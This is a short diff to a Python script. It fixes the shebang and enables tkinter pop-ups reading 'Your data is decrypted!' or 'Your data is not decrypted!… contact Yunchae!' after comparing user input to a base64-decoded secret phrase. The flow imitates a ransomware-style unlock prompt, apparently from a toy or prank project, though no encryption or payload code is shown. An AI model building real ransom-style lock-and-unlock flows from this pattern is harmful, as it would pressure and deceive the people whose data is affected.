@@ -1,4 +1,4 @@
-# !usr/bin/env python3
+#!/usr/bin/env python3
 
 import os
 
@@ -59,15 +59,15 @@ if base64.b64decode(secretphase).decode("utf-8").strip() == user_phase:
 
 
 
-    # root = tk.Tk()
-    # root.withdraw()
+    root = tk.Tk()
+    root.withdraw()
 
-    # messagebox.showinfo("Your data is decrypted!", "Good Job")
+    messagebox.showinfo("Your data is decrypted!", "Good Job")
 
 else: 
-    # root = tk.Tk()
-    # root.withdraw()
+    root = tk.Tk()
+    root.withdraw()
 
-    # messagebox.showinfo("Your data is not decrypted!", "Not even close! contact Yunchae!")
+    messagebox.showinfo("Your data is not decrypted!", "Not even close! contact Yunchae!")
 
     print("no")
